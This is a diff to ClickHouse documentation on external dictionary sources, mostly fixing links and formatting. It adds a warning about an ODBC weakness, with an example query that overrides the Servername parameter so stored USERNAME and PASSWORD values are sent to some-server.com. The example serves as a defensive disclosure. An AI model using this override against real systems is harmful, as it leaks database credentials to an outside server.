@@ -25,14 +25,14 @@ The source is configured in the `source` section.
 
 Types of sources (`source_type`):
 
-- [Local file](#dicts-external_dicts_dict_sources-local_file)
-- [Executable file](#dicts-external_dicts_dict_sources-executable)
-- [HTTP(s)](#dicts-external_dicts_dict_sources-http)
-- [ODBC](#dicts-external_dicts_dict_sources-odbc)
+- [Local file](#local-file)
+- [Executable file](#executable-file)
+- [HTTP(s)](#http-s)
 - DBMS
-   - [MySQL](#dicts-external_dicts_dict_sources-mysql)
-   - [ClickHouse](#dicts-external_dicts_dict_sources-clickhouse)
-   - [MongoDB](#dicts-external_dicts_dict_sources-mongodb)
+    - [MySQL](#mysql)
+    - [ClickHouse](#clickhouse)
+    - [MongoDB](#mongodb)
+    - [ODBC](#odbc)
 
 <a name="dicts-external_dicts_dict_sources-local_file"></a>
 
@@ -58,7 +58,7 @@ Setting fields:
 
 ## Executable File
 
-Working with executable files depends on [how the dictionary is stored in memory](external_dicts_dict_layout.md#dicts-external_dicts_dict_layout). If the dictionary is stored using `cache` and `complex_key_cache`, ClickHouse requests the necessary keys by sending a request to the executable file's `STDIN`.
+Working with executable files depends on [how the dictionary is stored in memory](external_dicts_dict_layout.md). If the dictionary is stored using `cache` and `complex_key_cache`, ClickHouse requests the necessary keys by sending a request to the executable file's `STDIN`.
 
 Example of settings:
 
@@ -80,7 +80,7 @@ Setting fields:
 
 ## HTTP(s)
 
-Working with an HTTP(s) server depends on [how the dictionary is stored in memory](external_dicts_dict_layout.md#dicts-external_dicts_dict_layout). If the dictionary is stored using `cache` and `complex_key_cache`, ClickHouse requests the necessary keys by sending a request via the `POST` method.
+Working with an HTTP(s) server depends on [how the dictionary is stored in memory](external_dicts_dict_layout.md). If the dictionary is stored using `cache` and `complex_key_cache`, ClickHouse requests the necessary keys by sending a request via the `POST` method.
 
 Example of settings:
 
@@ -93,7 +93,7 @@ Example of settings:
 </source>
 ```
 
-In order for ClickHouse to access an HTTPS resource, you must [configure openSSL](../../operations/server_settings/settings.md#server_settings-openSSL) in the server configuration.
+In order for ClickHouse to access an HTTPS resource, you must [configure openSSL](../../operations/server_settings/settings.md) in the server configuration.
 
 Setting fields:
 
@@ -111,7 +111,7 @@ Example of settings:
 ```xml
 <odbc>
     <db>DatabaseName</db>
-    <table>TableName</table>
+    <table>ShemaName.TableName</table>
     <connection_string>DSN=some_parameters</connection_string>
     <invalidate_query>SQL_QUERY</invalidate_query>
 </odbc>
@@ -120,11 +120,41 @@ Example of settings:
 Setting fields:
 
 - `db` – Name of the database. Omit it if the database name is set in the `<connection_string>` parameters.
-- `table` – Name of the table.
+- `table` – Name of the table and schema if exists.
 - `connection_string` – Connection string.
-- `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
+- `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md).
 
-## Example of Connecting PostgreSQL
+ClickHouse receives quoting symbols from ODBC-driver and quote all settings in queries to driver, so it's necessary to set table name accordingly to table name case in database.
+
+### Known vulnerability of the ODBC dictionary functionality
+
+!!! attention
+    When connecting to the database through the ODBC driver connection parameter `Servername` can be substituted. In this case values of `USERNAME` and `PASSWORD` from `odbc.ini` are sent to the remote server and can be compromised.
+
+**Example of insecure use**
+
+Let's configure unixODBC for PostgreSQL. Content of `/etc/odbc.ini`:
+
+```
+[gregtest]
+Driver = /usr/lib/psqlodbca.so
+Servername = localhost
+PORT = 5432
+DATABASE = test_db
+#OPTION = 3
+USERNAME = test
+PASSWORD = test
+```
+
+If you then make a query such as
+
+```
+SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');    
+```
+
+ODBC driver will send values of `USERNAME` and `PASSWORD` from `odbc.ini` to `some-server.com`.
+
+### Example of Connecting PostgreSQL
 
 Ubuntu OS.
 
@@ -160,9 +190,9 @@ The dictionary configuration in ClickHouse:
     <dictionary>
         <name>table_name</name>
         <source>
-        <odbc>
-            <!-- You can specifiy the following parameters in connection_string: -->
-            <!-- DSN=myconnection;UID=username;PWD=password;HOST=127.0.0.1;PORT=5432;DATABASE=my_db -->
+            <odbc>
+                <!-- You can specify the following parameters in connection_string: -->
+                <!-- DSN=myconnection;UID=username;PWD=password;HOST=127.0.0.1;PORT=5432;DATABASE=my_db -->
                 <connection_string>DSN=myconnection</connection_string>
                 <table>postgresql_table</table>
             </odbc>
@@ -203,7 +233,7 @@ Installing the driver: :
 Configuring the driver: :
 
 ```
-    $ cat /etc/freetds/freetds.conf 
+    $ cat /etc/freetds/freetds.conf
     ...
 
     [MSSQL]
@@ -212,7 +242,7 @@ Configuring the driver: :
     tds version = 7.0
     client charset = UTF-8
 
-    $ cat /etc/odbcinst.ini 
+    $ cat /etc/odbcinst.ini
     ...
 
     [FreeTDS]
@@ -222,7 +252,7 @@ Configuring the driver: :
     FileUsage       = 1
     UsageCount      = 5
 
-    $ cat ~/.odbc.ini 
+    $ cat ~/.odbc.ini
     ...
 
     [MSSQL]
@@ -310,9 +340,9 @@ Setting fields:
 - `password` – Password of the MySQL user. You can specify it for all replicas, or for each one individually (inside `<replica>`).
 
 - `replica` – Section of replica configurations. There can be multiple sections.
-   - `replica/host` – The MySQL host.
+    - `replica/host` – The MySQL host.
 
-   \* `replica/priority` – The replica priority. When attempting to connect, ClickHouse traverses the replicas in order of priority. The lower the number, the higher the priority.
+    \* `replica/priority` – The replica priority. When attempting to connect, ClickHouse traverses the replicas in order of priority. The lower the number, the higher the priority.
 
 - `db` – Name of the database.
 
@@ -320,7 +350,7 @@ Setting fields:
 
 - `where ` – The selection criteria. Optional parameter.
 
-- `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
+- `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md).
 
 MySQL can be connected on a local host via sockets. To do this, set `host` and `socket`.
 
@@ -363,13 +393,14 @@ Example of settings:
 
 Setting fields:
 
-- `host` – The ClickHouse host. If it is a local host, the query is processed without any network activity. To improve fault tolerance, you can create a [Distributed](../../operations/table_engines/distributed.md#table_engines-distributed) table and enter it in subsequent configurations.
+- `host` – The ClickHouse host. If it is a local host, the query is processed without any network activity. To improve fault tolerance, you can create a [Distributed](../../operations/table_engines/distributed.md) table and enter it in subsequent configurations.
 - `port` – The port on the ClickHouse server.
 - `user` – Name of the ClickHouse user.
 - `password` – Password of the ClickHouse user.
 - `db` – Name of the database.
 - `table` – Name of the table.
 - `where ` – The selection criteria. May be omitted.
+- `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md).
 
 <a name="dicts-external_dicts_dict_sources-mongodb"></a>
 
@@ -399,3 +430,4 @@ Setting fields:
 - `db` – Name of the database.
 - `collection` – Name of the collection.
 
+[Original article](https://clickhouse.yandex/docs/en/query_language/dicts/external_dicts_dict_sources/) <!--hide-->
